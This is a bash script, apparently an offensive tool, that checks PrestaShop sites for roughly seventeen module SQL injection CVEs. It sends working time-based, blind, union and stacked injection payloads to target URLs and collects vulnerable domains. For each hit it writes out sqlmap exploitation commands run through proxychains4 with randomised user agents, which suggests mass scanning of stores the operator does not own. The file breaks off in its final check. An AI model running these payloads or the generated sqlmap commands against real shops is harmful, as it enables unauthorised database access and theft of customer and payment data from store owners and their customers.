#!/bin/bash
# Universal PrestaShop SQLi Validator
# Validates ALL SQLi CVEs from nuclei templates
# Usage: ./validate_all_sqli.sh [-o output_dir] <nuclei_output.txt or single_url>
# Input: nuclei output file (auto-detects CVE) or URL (runs all checks)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

SLEEP_SEC=6
THRESHOLD=5
TIMEOUT=20
TIMEOUT_LONG=30
OUTDIR=""

while getopts "o:" opt; do
    case $opt in
        o) OUTDIR="$OPTARG" ;;
        *) ;;
    esac
done
shift $((OPTIND-1))

if [ -z "$OUTDIR" ]; then
    OUTDIR="/tmp/validate_$(date +%Y%m%d_%H%M%S)"
fi
mkdir -p "$OUTDIR"
RESULTS="${OUTDIR}/results.txt"
SQLMAP_FILE="${OUTDIR}/sqlmap_commands.txt"
VULN_DOMAINS="${OUTDIR}/vuln_domains.txt"
LOG_FILE="${OUTDIR}/full_log.txt"
> "$RESULTS"
> "$SQLMAP_FILE"
> "$VULN_DOMAINS"
exec > >(tee -a "$LOG_FILE") 2>&1

log_vuln() {
    local DOMAIN="$1" CVE="$2" STATUS="$3" DETAILS="$4"
    echo -e "${GREEN}  [${CVE}] ${STATUS}: ${DETAILS}${NC}"
    echo "${DOMAIN}|${CVE}|${STATUS}|${DETAILS}" >> "$RESULTS"
    grep -qxF "$DOMAIN" "$VULN_DOMAINS" 2>/dev/null || echo "$DOMAIN" >> "$VULN_DOMAINS"
}

log_safe() {
    local DOMAIN="$1" CVE="$2" DETAILS="$3"
    echo -e "${RED}  [${CVE}] SAFE: ${DETAILS}${NC}"
}

add_sqlmap() {
    local CMD="$1"
    echo "$CMD" >> "$SQLMAP_FILE"
    echo -e "${CYAN}  sqlmap: ${CMD}${NC}"
}

time_check() {
    local URL="$1" METHOD="$2" DATA="$3" HDRS="$4" EXPECT_SLEEP="$5"
    local START END DUR HTTP_CODE
    [ -z "$EXPECT_SLEEP" ] && EXPECT_SLEEP=$SLEEP_SEC
    local TO=$TIMEOUT
    [ "$EXPECT_SLEEP" -ge 8 ] && TO=$TIMEOUT_LONG

    START=$(date +%s%N)
    if [ "$METHOD" = "GET" ]; then
        HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m $TO -L \
            -H "X-Requested-With: XMLHttpRequest" \
            ${HDRS:+-H "$HDRS"} \
            "$URL" 2>/dev/null)
    else
        HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m $TO -L \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "X-Requested-With: XMLHttpRequest" \
            ${HDRS:+-H "$HDRS"} \
            -d "$DATA" \
            "$URL" 2>/dev/null)
    fi
    END=$(date +%s%N)
    DUR=$(( (END - START) / 1000000000 ))
    echo "$DUR"
}

body_check() {
    local URL="$1" METHOD="$2" DATA="$3" HDRS="$4"
    if [ "$METHOD" = "GET" ]; then
        curl -sk -m 15 -L \
            -H "X-Requested-With: XMLHttpRequest" \
            ${HDRS:+-H "$HDRS"} \
            "$URL" 2>/dev/null
    else
        curl -sk -m 15 -L \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "X-Requested-With: XMLHttpRequest" \
            ${HDRS:+-H "$HDRS"} \
            -d "$DATA" \
            "$URL" 2>/dev/null
    fi
}

# ============================================
# CVE-2022-22897: appagebuilder (product_one_img, pro_add)
# ============================================
check_cve_2022_22897() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2022-22897"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] appagebuilder — product_one_img + pro_add${NC}"

    local CFG_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/appagebuilder/config.xml" 2>/dev/null)
    if [ "$CFG_HTTP" != "200" ]; then
        echo -e "${RED}  Module not found (HTTP ${CFG_HTTP})${NC}"
        return
    fi

    local RAND=$((RANDOM * RANDOM))
    local DUR=$(time_check "${BASE_URL}/modules/appagebuilder/apajax.php?rand=${RAND}" "POST" "leoajax=1&product_one_img=if(now()=sysdate()%2Csleep(${SLEEP_SEC})%2C0)" "Referer: ${BASE_URL}/")

    if [ "$DUR" -ge "$THRESHOLD" ]; then
        RAND=$((RANDOM * RANDOM))
        local CTRL=$(time_check "${BASE_URL}/modules/appagebuilder/apajax.php?rand=${RAND}" "POST" "leoajax=1&product_one_img=if(1=2%2Csleep(${SLEEP_SEC})%2C0)" "Referer: ${BASE_URL}/")
        if [ "$CTRL" -lt "$THRESHOLD" ]; then
            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "product_one_img time-based sleep=${DUR}s ctrl=${CTRL}s"
            VULNS=$((VULNS+1))
            add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/appagebuilder/apajax.php?rand=1\" --data=\"leoajax=1&product_one_img=1\" -p product_one_img --headers=\"X-Requested-With: XMLHttpRequest\" --referer=\"${BASE_URL}/\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
        fi
    fi

    local RN=$((RANDOM % 9000 + 1000))
    RAND=$((RANDOM * RANDOM))
    local BODY_T=$(body_check "${BASE_URL}/modules/appagebuilder/apajax.php?rand=${RAND}" "POST" "leoajax=1&product_one_img=-${RN}) OR 6644=6644-- yMwI" "Referer: ${BASE_URL}/")
    local LT=${#BODY_T}
    RAND=$((RANDOM * RANDOM))
    local BODY_F=$(body_check "${BASE_URL}/modules/appagebuilder/apajax.php?rand=${RAND}" "POST" "leoajax=1&product_one_img=-${RN}) OR 6643=6644-- yMwI" "Referer: ${BASE_URL}/")
    local LF=${#BODY_F}

    if [ "$LT" -gt 200 ] && [ "$LF" -le 50 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "product_one_img blind true=${LT} false=${LF}"
        VULNS=$((VULNS+1))
        [ "$VULNS" -eq 1 ] && add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/appagebuilder/apajax.php?rand=1\" --data=\"leoajax=1&product_one_img=1\" -p product_one_img --headers=\"X-Requested-With: XMLHttpRequest\" --referer=\"${BASE_URL}/\" --technique=B --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    elif [ "$LT" -gt "$LF" ] && [ $((LT - LF)) -gt 100 ]; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "product_one_img blind diff=$((LT-LF))"
        VULNS=$((VULNS+1))
    fi

    RAND=$((RANDOM * RANDOM))
    DUR=$(time_check "${BASE_URL}/modules/appagebuilder/apajax.php?rand=${RAND}" "POST" "leoajax=1&pro_add=if(now()=sysdate()%2Csleep(${SLEEP_SEC})%2C0)" "Referer: ${BASE_URL}/")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "pro_add time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/appagebuilder/apajax.php?rand=1\" --data=\"leoajax=1&pro_add=1\" -p pro_add --headers=\"X-Requested-With: XMLHttpRequest\" --referer=\"${BASE_URL}/\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-30150: leocustomajax (pro_add, cat_list)
# ============================================
check_cve_2023_30150() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-30150"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] leocustomajax — pro_add + cat_list${NC}"

    local JS_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/leocustomajax/leocustomajax.js" 2>/dev/null)
    if [ "$JS_HTTP" != "200" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local RAND=$((RANDOM * RANDOM))
    local DUR=$(time_check "${BASE_URL}/modules/leocustomajax/leoajax.php?rand=${RAND}" "POST" "leoajax=1&pro_add=if(now()=sysdate()%2Csleep(${SLEEP_SEC})%2C0)" "Referer: ${BASE_URL}/")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "pro_add time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/leocustomajax/leoajax.php?rand=1\" --data=\"leoajax=1&pro_add=1\" -p pro_add --headers=\"X-Requested-With: XMLHttpRequest\" --referer=\"${BASE_URL}/\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    DUR=$(time_check "${BASE_URL}/modules/leocustomajax/leoajax.php?cat_list=(SELECT(0)FROM(SELECT(SLEEP(${SLEEP_SEC})))a)" "GET" "" "Referer: ${BASE_URL}/")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "cat_list time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/leocustomajax/leoajax.php?cat_list=1\" -p cat_list --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2021-36748: ph_simpleblog (sb_category)
# ============================================
check_cve_2021_36748() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2021-36748"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] ph_simpleblog — sb_category blind${NC}"

    local BODY_T=$(body_check "${BASE_URL}/module/ph_simpleblog/list?sb_category=')%20OR%20true--%20-" "GET")
    local LT=${#BODY_T}
    local BODY_F=$(body_check "${BASE_URL}/module/ph_simpleblog/list?sb_category=')%20AND%20false--%20-" "GET")
    local LF=${#BODY_F}

    echo -e "  true=${LT} false=${LF}"

    if [ "$LT" -gt 200 ] && [ "$LF" -lt "$LT" ] && [ $((LT - LF)) -gt 100 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "sb_category blind true=${LT} false=${LF}"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/ph_simpleblog/list?sb_category=1\" -p sb_category --technique=B --dbms=MySQL --level=2 --risk=2 --batch --random-agent --prefix=\"')\" --suffix=\"-- -\""
    elif [ "$LT" -gt 0 ] && [ "$LF" -eq 0 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "sb_category blind true=${LT} false=empty"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/ph_simpleblog/list?sb_category=1\" -p sb_category --technique=B --dbms=MySQL --level=2 --risk=2 --batch --random-agent --prefix=\"')\" --suffix=\"-- -\""
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no diff (true=${LT} false=${LF})"
}

# ============================================
# CVE-2023-27847: xipblog (subpage_type)
# ============================================
check_cve_2023_27847() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27847"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] xipblog — subpage_type time/blind/union${NC}"

    local DUR=$(time_check "${BASE_URL}/module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post\"+AND+(SELECT+5728+FROM+(SELECT(SLEEP(5)))AuDU)--+lafl" "GET")
    if [ "$DUR" -ge 4 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "subpage_type time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post\" -p subpage_type --technique=TU --dbms=MySQL --level=2 --risk=2 --batch --random-agent --prefix='\"' --suffix='-- -'"
    fi

    local BODY_T=$(body_check "${BASE_URL}/module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post\"+AND+5484=5484--+xhCs" "GET")
    local LT=${#BODY_T}
    local BODY_F=$(body_check "${BASE_URL}/module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post\"+AND+5484=5485--+xhCs" "GET")
    local LF=${#BODY_F}

    if [ "$LT" -gt 200 ] && [ "$LF" -lt "$LT" ] && [ $((LT - LF)) -gt 100 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "subpage_type blind true=${LT} false=${LF}"
        VULNS=$((VULNS+1))
    fi

    local NUM=$((RANDOM % 900000000 + 100000000))
    local MD5_EXPECT=$(echo -n "$NUM" | md5sum | cut -d' ' -f1)
    local UNION_BODY=$(body_check "${BASE_URL}/module/xipblog/archive?id=1&page_type=category&rewrite=news&subpage_type=post\"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(${NUM})),NULL,NULL--+-" "GET")
    if echo "$UNION_BODY" | grep -q "$MD5_EXPECT"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "subpage_type union-based md5 match"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-39650: tvcmsblog (page_type)
# ============================================
check_cve_2023_39650() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-39650"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] tvcmsblog — page_type time/blind${NC}"

    local DUR=$(time_check "${BASE_URL}/module/tvcmsblog/single?SubmitCurrency=1&id=14&id_currency=2&page_type=post\"+AND+(SELECT+7826+FROM+(SELECT(SLEEP(${SLEEP_SEC})))oqFL)--+yxoW" "GET" "" "" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "page_type time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/tvcmsblog/single?SubmitCurrency=1&id=14&id_currency=2&page_type=post\" -p page_type --technique=TB --dbms=MySQL --level=2 --risk=2 --batch --random-agent --prefix='\"' --suffix='-- -'"
    fi

    local BODY_T=$(body_check "${BASE_URL}/module/tvcmsblog/single?SubmitCurrency=1&id=14&id_currency=2&page_type=post\"+AND+5484=5484--+xhCs" "GET")
    local LT=${#BODY_T}
    local BODY_F=$(body_check "${BASE_URL}/module/tvcmsblog/single?SubmitCurrency=1&id=14&id_currency=2&page_type=post\"+AND+5484=5485--+xhCs" "GET")
    local LF=${#BODY_F}

    if [ "$LT" -gt 200 ] && [ "$LF" -lt "$LT" ] && [ $((LT - LF)) -gt 100 ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "page_type blind true=${LT} false=${LF}"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2021-37538: smartblog (day param, union)
# ============================================
check_cve_2021_37538() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2021-37538"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] smartblog — day union${NC}"

    local UNION_BODY=$(body_check "${BASE_URL}/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-" "GET")
    local MD5_55555="2e14bced09536cf0d960e48856651a01"

    if echo "$UNION_BODY" | grep -q "$MD5_55555"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "day union-based md5 match"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/smartblog/archive?month=1&year=1&day=1\" -p day --technique=U --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no union match"
}

# ============================================
# CVE-2023-30192: possearchproducts (id_category)
# ============================================
check_cve_2023_30192() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-30192"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] possearchproducts — id_category time${NC}"

    local DUR=$(time_check "${BASE_URL}/modules/possearchproducts/SearchProducts.php" "POST" "id_category=10*if(now()=sysdate()%2Csleep(${SLEEP_SEC})%2C0)&id_lang=3&resultsPerPage=10&s=the" "Referer: ${BASE_URL}/")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_category time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/possearchproducts/SearchProducts.php\" --data=\"id_category=10&id_lang=3&resultsPerPage=10&s=the\" -p id_category --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    local ERR=$(body_check "${BASE_URL}/modules/possearchproducts/SearchProducts.php" "POST" "id_category=10'&id_lang=3&resultsPerPage=10&s=the" "Referer: ${BASE_URL}/")
    if echo "$ERR" | grep -qi "SQL syntax\|mysql_\|PDOException"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_category error-based"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2020-26248: productcomments (id_products)
# ============================================
check_cve_2020_26248() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2020-26248"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] productcomments — id_products time${NC}"

    local MODULE_BODY=$(curl -sk -m 8 -L "${BASE_URL}/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=1" 2>/dev/null)
    if ! echo "$MODULE_BODY" | grep -q "average_grade"; then
        echo -e "${RED}  Module not found or not returning JSON${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(${SLEEP_SEC})))a)" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_products time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1\" -p \"id_products[]\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-27637: tshirtecommerce (parent_id stacked)
# ============================================
check_cve_2023_27637() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27637"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] tshirtecommerce — parent_id stacked time${NC}"

    local PREREQ_BODY=$(curl -sk -m 10 -L "${BASE_URL}/module/tshirtecommerce/designer?product_id=1" 2>/dev/null)
    if ! echo "$PREREQ_BODY" | grep -qi "tshirtecommerce\|product not found\|designer"; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(${SLEEP_SEC});" "GET" "" "" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "parent_id stacked sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/tshirtecommerce/designer?product_id=900982561&parent_id=1\" -p parent_id --technique=T --dbms=MySQL --level=3 --risk=3 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-27638: tshirtecommerce (design_cart_id)
# ============================================
check_cve_2023_27638() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27638"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] tshirtecommerce — design_cart_id time${NC}"

    local DUR=$(time_check "${BASE_URL}/module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1%20OR%20SLEEP(${SLEEP_SEC})" "GET" "" "" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "design_cart_id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1\" -p tshirtecommerce_design_cart_id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2022-31101: blockwishlist (order param, time)
# ============================================
check_cve_2022_31101() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2022-31101"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] blockwishlist — order time${NC}"

    local DUR=$(time_check "${BASE_URL}/module/blockwishlist/view?id_wishlist=1&order=p.name,%20(select%20case%20when%20(1=1)%20then%20(SELECT%20SLEEP(7))%20else%201%20end);%20--%20.asc" "GET" "" "Referer: ${BASE_URL}/" 7)
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "order time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/blockwishlist/view?id_wishlist=1&order=p.name.asc\" -p order --technique=T --dbms=MySQL --level=3 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-45375: pireospay (MerchantReference)
# ============================================
check_cve_2023_45375() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-45375"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] pireospay — MerchantReference stacked${NC}"

    local DUR=$(time_check "${BASE_URL}/module/pireospay/validation" "POST" "ajax=true&MerchantReference=1%22;select(0x73656c65637420736c6565702836293b)INTO@a;prepare\`b\`from@a;execute\`b\`;--" "Referer: ${BASE_URL}/" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "MerchantReference stacked sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/pireospay/validation\" --data=\"ajax=true&MerchantReference=1\" -p MerchantReference --technique=T --dbms=MySQL --level=3 --risk=3 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-46347: ndk_steppingpack (search_query)
# ============================================
check_cve_2023_46347() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-46347"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] ndk_steppingpack — search_query stacked/union${NC}"

    local DUR=$(time_check "${BASE_URL}/modules/ndk_steppingpack/search-result.php" "POST" "search_query=1%22%29;select+0x73656c65637420736c6565702836293b+into+@a;prepare+b+from+@a;execute+b;--" "Referer: ${BASE_URL}/" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "search_query stacked sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/ndk_steppingpack/search-result.php\" --data=\"search_query=1\" -p search_query --technique=TU --dbms=MySQL --level=3 --risk=3 --batch --random-agent"
    fi

    local NUM=$((RANDOM % 900000000 + 100000000))
    local MD5_EXPECT=$(echo -n "$NUM" | md5sum | cut -d' ' -f1)
    local UNION_BODY=$(body_check "${BASE_URL}/modules/ndk_steppingpack/search-result.php" "POST" "search_query=1\")+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(${NUM})),NULL,NULL,NULL,NULL--+-" "Referer: ${BASE_URL}/")
    if echo "$UNION_BODY" | grep -q "$MD5_EXPECT"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "search_query union md5 match"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-36683: productsalert (paemail)
# ============================================
check_cve_2024_36683() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-36683"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] productsalert — paemail time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/productsalert/pasubmit.php?submitpa&redirect_to=https://${DOMAIN}&type=2" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    # Try pasubmit.php first (primary endpoint in YAML), then AjaxProcess (fallback)
    local DUR=$(time_check "${BASE_URL}/modules/productsalert/pasubmit.php?submitpa&redirect_to=https://${DOMAIN}&type=2" "POST" "cid=0&idl=6&option=2&pa_option=96119&paemail=1'+AND+(SELECT+2692+FROM+(SELECT(SLEEP(${SLEEP_SEC})))IuFA)+AND+'pAlk'='pAlk&pasubmit=submit&pid=13158" "Referer: ${BASE_URL}/" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "paemail time-based (pasubmit.php) sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/productsalert/pasubmit.php?submitpa&redirect_to=https://${DOMAIN}&type=2\" --data=\"cid=0&idl=6&option=2&pa_option=96119&paemail=1&pasubmit=submit&pid=13158\" -p paemail --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    else
        local DUR2=$(time_check "${BASE_URL}/module/productsalert/AjaxProcess" "POST" "cid=0&idl=6&option=2&pa_option=96119&paemail=1'+AND+(SELECT+2692+FROM+(SELECT(SLEEP(${SLEEP_SEC})))IuFA)+AND+'pAlk'='pAlk&pid=13158" "Referer: ${BASE_URL}/" "$SLEEP_SEC")
        if [ "$DUR2" -ge "$THRESHOLD" ]; then
            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "paemail time-based (AjaxProcess) sleep=${DUR2}s"
            VULNS=$((VULNS+1))
            add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/productsalert/AjaxProcess\" --data=\"cid=0&idl=6&option=2&pa_option=96119&paemail=1&pid=13158\" -p paemail --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
        fi
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2022-31181: PrestaShop core SQLi→eval (unauthenticated timing probe)
# ============================================
check_cve_2022_31181() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2022-31181"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] PrestaShop core — SQLi via MySQL Smarty cache (timing probe)${NC}"

    local DUR=$(time_check "${BASE_URL}/module/blockwishlist/view?id_wishlist=1&order=product.price;(select(sleep(${SLEEP_SEC})));--.desc&from-xhr=" "GET" "" "Referer: ${BASE_URL}/")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "blockwishlist order stacked sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/blockwishlist/view?id_wishlist=1&order=product.price.desc&from-xhr=\" -p order --technique=T --dbms=MySQL --level=3 --risk=3 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected (full exploit requires auth)"
}

# ============================================
# apmarketplace: passwordrecovery (email)
# ============================================
check_apmarketplace_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="apmarketplace-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] apmarketplace — email time${NC}"

    local DUR=$(time_check "${BASE_URL}/m/apmarketplace/passwordrecovery" "POST" "email=\"+AND+(SELECT+3472+FROM+(SELECT(SLEEP(${SLEEP_SEC})))UTQK)--+IGIe&submit_reset_pwd=" "Referer: ${BASE_URL}/")
